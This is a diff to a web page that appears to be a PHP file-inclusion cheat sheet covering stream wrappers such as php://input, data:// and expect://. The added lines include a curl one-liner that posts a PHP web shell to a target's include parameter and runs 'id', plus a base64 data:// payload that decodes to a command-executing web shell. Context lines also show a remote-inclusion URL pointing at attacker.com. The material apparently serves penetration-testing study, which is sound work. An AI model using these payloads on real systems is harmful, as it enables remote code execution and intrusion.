@@ -57,6 +57,7 @@ ftp://user:pass@attacker.com/evil.txt</code></pre>
                    <pre><code class="language-php">php://filter/convert.base64-encode/resource=index.php</code></pre>
                    <p>Or to inject php code - Send PHP payload in POST body</p>
                    <pre><code class="language-php">php://input</code></pre>
+                   <pre><code class="language-php">curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://10.10.10.1:8080/index.php?language=php://input&cmd=id" | grep uid</code></pre>
                 </ul>
 
                 <h3>zlib://</h3>
@@ -67,8 +68,8 @@ ftp://user:pass@attacker.com/evil.txt</code></pre>
 
                 <h3>data://</h3>
                     <ul>
-                       <p>Inline payloads - RCE if allow_url_include=On</p>
-                       <pre><code class="language-php">data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code></pre> 
+                       <p>Inline payloads - RCE if allow_url_include=On   (/etc/php/X.Y/fpm/php.ini)</p>
+                       <pre><code class="language-php">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</code></pre> 
                     </ul>
                 <h3>glob://</h3>
                     <ul>
@@ -102,6 +103,7 @@ ftp://user:pass@attacker.com/evil.txt</code></pre>
                 <h3>expect://</h3>
                     <ul>
                         <p>Process Interaction Streams - Direct command ejecution</p>
+                        <p>Not always installed, search for expect in /etc/php/X.Y/fpm/php.ini</p>
                         <pre><code class="language-php">expect://id</code></pre>  
                     </ul>                
             </ul>   
